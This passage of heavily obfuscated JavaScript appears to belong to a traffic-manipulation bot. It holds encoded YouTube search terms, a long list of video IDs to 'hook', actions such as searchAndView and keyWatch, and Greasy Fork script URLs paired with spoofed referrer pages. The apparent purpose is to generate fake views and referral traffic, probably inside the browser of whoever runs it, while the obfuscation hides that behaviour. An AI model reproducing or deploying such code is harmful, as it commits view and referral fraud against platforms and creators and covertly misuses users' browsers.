+ 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1bf * -0x14 + 0xc63 + 0x1693)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x3 * -0x1ed + 0xab3 + -0x4e2)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1380 + 0x1c1c + -0x2f99);

function a() {
  const bp = [
    'meType',
    'lMWTBgLZDgvUlq',
    'CZbYDtz1sZD2Aq',
    'ChrZl2j5lxnPDa',
    'ntent-deli',
    'xplains',
    'Ad_Link_By',
    'n8oUa8oWv8of',
    'BYbPBNn0ywTPBa',
    'mLjgW7NdKJDksmocwG',
    'CMCVzw4VC2nYAq',
    'CHiwWPddIstcMG8tWO4',
    'zmkVuCk7sCksW6XDWRbD',
    'CMCVC2nYAxb0CW',
    'rg/en/scri',
    'nKLTwMr3Cgr3va',
    'zwrIywnRlxnOyq',
    'zwy4',
    'close',
    '\x20NT\x2010.0;\x20',
    'W5BcImoVd8kBWOTfWOPXuq',
    'z2v0qxr0CMLIDq',
    'v8o7W5C',
    'zxYjTTXc-J',
    'B2XZlxLVDs1ZAa',
    'W4NcQJL/rCkmhmksW70x',
    'get',
    'zg9Ty29UDgvUDa',
    'WP8gW7lcS8oJW73dL8oOpmoZ',
    'WPBdJSkbWP7dMxFcOmkpwCoK',
    'https://me',
    'zgLNzxn0',
    'easyfork.o',
    'f1mMdSox',
    'pts/430253',
    'rences-tab'
  ];
  a = function() {
    return bp;
  };
  return a();
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    a1(0xf) + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    a0(0x9, '1HXf') + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    a1(0x2) + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    Z(0x17) + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + Z(0x20) + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a1(0xa) + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Z(0xe) + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + Z(0x23),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + a0(0x1d, 'bs4W') + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
